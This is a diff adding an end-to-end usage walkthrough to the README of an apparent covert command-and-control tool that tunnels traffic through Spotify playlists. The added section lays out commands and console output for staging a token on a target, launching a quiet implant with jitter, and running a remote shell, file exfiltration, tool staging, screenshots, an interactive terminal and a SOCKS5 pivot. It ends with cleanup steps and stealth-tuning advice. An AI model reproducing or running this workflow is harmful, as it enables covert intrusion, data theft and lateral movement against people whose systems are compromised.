@@ -216,6 +216,90 @@ make upx-pack               # optional UPX pass on implant binaries (see note)
 
 ## Usage
 
+### End-to-end example: your first operation in 5 minutes
+
+From zero to a working remote shell over Spotify playlists:
+
+**1. One-time Spotify setup** (see [Prerequisites](#prerequisites)): create a
+developer app, then put the credentials in `~/.spotexfil.conf` on **both** the
+operator machine and the target:
+
+```ini
+[spotify]
+username = YourUsername
+client_id = your_client_id
+client_secret = your_client_secret
+redirect_uri = http://127.0.0.1:8888/callback
+```
+
+**2. Stage a token on the target.** Authenticate once on your own machine (any
+spotexfil command triggers the browser OAuth flow and writes `.cache-<username>`),
+then copy that file to the target — or export it inline:
+
+```bash
+# on the operator machine: mint the token once
+./spotexfil clean
+
+# deliver it to the target however you like, then there:
+export SPOTIFY_TOKEN_JSON="$(cat .cache-YourUsername)"
+```
+
+**3. Start the implant on the target** (quiet mode, key to file — nothing
+sensitive on stdout):
+
+```bash
+./spotexfil-implant-darwin-arm64 --quiet --key-file /tmp/.sk --interval 30 --jitter 10
+```
+
+**4. Start the operator** with the key the implant generated:
+
+```bash
+./spotexfil c2-operator -k "$(cat /tmp/.sk)" --live
+```
+
+**5. Operate.** Within ~60s the implant checks in and forward secrecy
+negotiates automatically:
+
+```
+[+] New implant: Kepler
+    alias     : Kepler
+    client_id : 7f3a2b1c
+    hostname  : target.local
+    os        : darwin/arm64
+    user      : admin
+
+[15:30] c2> attach kepler
+[*] Attached to Kepler (target.local)
+
+[15:30] Kepler@target.local > whoami
+[*] Command queued: seq=1 module=shell
+--- Result seq=1 [shell] status=ok ---
+admin
+
+[15:31] Kepler@target.local > sysinfo        # OS/network recon
+[15:32] Kepler@target.local > exfil /etc/hosts   # pull a file
+[15:33] Kepler@target.local > push ./tool.sh /tmp/tool.sh  # stage a file
+[15:34] Kepler@target.local > screenshot     # saved locally as JPEG
+[15:35] Kepler@target.local > pty            # full interactive terminal
+[*] PTY session active — Ctrl+] to exit
+admin@target.local:~$ vim /tmp/notes.txt   # yes, really
+admin@target.local:~$ ^]
+[*] PTY session closed
+
+[15:40] Kepler@target.local > tunnel 1080    # SOCKS5 pivot via the implant
+[*] SOCKS5 tunnel listening on 127.0.0.1:1080 (via Kepler)
+
+[15:45] Kepler@target.local > history        # everything is journaled
+[15:46] Kepler@target.local > detach
+[15:46] c2> clean                            # wipe all C2 playlists
+[15:47] c2> quit                             # implants get an encrypted shutdown
+```
+
+Prefer less output and fewer API calls? Run both sides with `--live`
+(edit-in-place session playlists). Prefer stealth over speed? Keep the
+default create/delete churn, raise `--interval`, and use
+`--modules shell,exfil,sysinfo,push` to leave screenshot off the target.
+
 ### C2 Mode
 
 ```bash
